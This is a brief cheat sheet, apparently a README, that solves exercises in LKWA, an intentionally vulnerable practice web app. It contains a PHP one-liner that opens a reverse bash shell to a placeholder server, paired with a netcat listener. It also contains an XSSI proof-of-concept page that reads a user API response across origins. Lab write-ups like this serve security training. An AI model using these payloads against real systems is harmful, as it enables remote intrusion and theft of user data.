# lkwa-cheatsheet

- my environment: macOS Catalina 10.15.6

Thanks [LKWA](https://github.com/weev3/LKWA).

## 0x01 – Blind RCE

try `sleep 5`

### Reverse Shell

- in my macOS Terminal
  - `nc -l your.server.ip.address 8888`
- in the Browser(text box)
  - `php -r '$sock=fsockopen("your.server.ip.address",8888);exec("/bin/bash -i <&3 >&3 2>&3");'`

## 0x02 – XSSI

you will find `api/user` in response body.  
try `curl http://localhost:3000/api/user`

### deploy tiny hacking server

```bash
mkdir xssi-server
cd xssi-server/
vi index.html
```

```html
<html>
  <head>
    <title>XSSI</title>
  </head>
  <body>
    <script>
      function a(s)
      {
        alert(JSON.stringify(s));
      }
    </script>
    <script src="http://localhost:3000/api/user"></script>
  </body>
</html>
```

deploy: `python3 -m http.server 3001`

access `http://localhost:3001/index.html` from browser.

<img src="https://github.com/fujiokayu/lkwa-cheatsheet/blob/master/evidence/0x02.png" width="200">

## 0x03 – PHP Object Injection
